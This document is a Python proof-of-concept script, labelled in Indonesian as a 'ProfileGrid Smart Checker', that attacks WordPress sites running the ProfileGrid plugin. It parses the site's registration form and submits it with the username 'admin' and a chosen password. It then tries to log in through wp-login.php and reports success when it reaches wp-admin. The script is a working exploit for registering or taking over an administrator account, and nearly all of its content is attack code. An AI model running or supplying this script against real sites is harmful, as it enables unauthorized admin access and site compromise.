#!/usr/bin/env python3
"""
ProfileGrid Smart Checker - Versi Final
"""

import argparse
import asyncio
import re
import urllib.parse
import aiohttp
from html.parser import HTMLParser

class FormParser(HTMLParser):
    def __init__(self):
        super().__init__()
        self.action = ""
        self.inputs = []

    def handle_starttag(self, tag, attrs):
        attr = {k.lower(): v for k, v in attrs if v}
        if tag == "form":
            self.action = attr.get("action", "")
        if tag in ("input", "textarea", "select") and "name" in attr:
            self.inputs.append(attr)

async def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", required=True)
    parser.add_argument("--email", required=True)
    parser.add_argument("--password", default="PocPassword123!")
    parser.add_argument("--username", default="admin")
    parser.add_argument("--debug", action="store_true")

    args = parser.parse_args()

    print("="*90)
    print("ProfileGrid Smart Checker - Final Version")
    print("="*90)

    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
        
        async with session.get(args.url, timeout=15) as resp:
            body = await resp.text()

        parser = FormParser()
        parser.feed(body)

        action_url = urllib.parse.urljoin(args.url, parser.action) if parser.action else args.url
        print(f"[+] Action URL : {action_url}")

        # Filter field
        data = {}
        for field in parser.inputs:
            name = field.get("name")
            if not name or name in data:
                continue
            if name == "user_login":
                data[name] = args.username
            elif name == "user_email":
                data[name] = args.email
            elif "pass" in name.lower():
                data[name] = args.password
            elif name == "reg_form_submit":
                data[name] = "Submit"
            else:
                data[name] = "Test"

        if args.debug:
            print(f"[DEBUG] Field dikirim: {list(data.keys())}")

        print(f"[+] Mengirim POST ke {action_url}...")
        try:
            async with session.post(action_url, data=data, timeout=20) as resp:
                status = resp.status
                text = await resp.text()
                lowered = text.lower()

            print(f"[+] HTTP Status: {status}")

            if status == 404:
                print("❌ 404 - Endpoint registrasi tidak ditemukan (kemungkinan sudah di-patch)")
            elif status == 403:
                print("❌ 403 - Diblokir security")
            elif "pm-error" in lowered:
                print("❌ Ada pm-error")
            elif any(x in lowered for x in ["success", "registered", "thank you"]):
                print("🎉 Potensi Berhasil!")
            else:
                print("⚠️  Hasil tidak jelas")

        except Exception as e:
            print(f"[-] POST Error: {e}")

        # Login
        print("\n[2/2] Mencoba Login...")
        login_url = urllib.parse.urljoin(args.url, "/wp-login.php")
        try:
            async with session.post(login_url, data={"log": args.username, "pwd": args.password, "wp-submit": "Log In"}, allow_redirects=True) as resp:
                final = str(resp.url)
                print(f"   Final URL: {final}")
                if "wp-admin" in final.lower():
                    print("🎉 BERHASIL LOGIN!")
                else:
                    print("❌ Login Gagal")
        except:
            print("[-] Login check gagal")

    print("="*90)

if __name__ == "__main__":
    asyncio.run(main())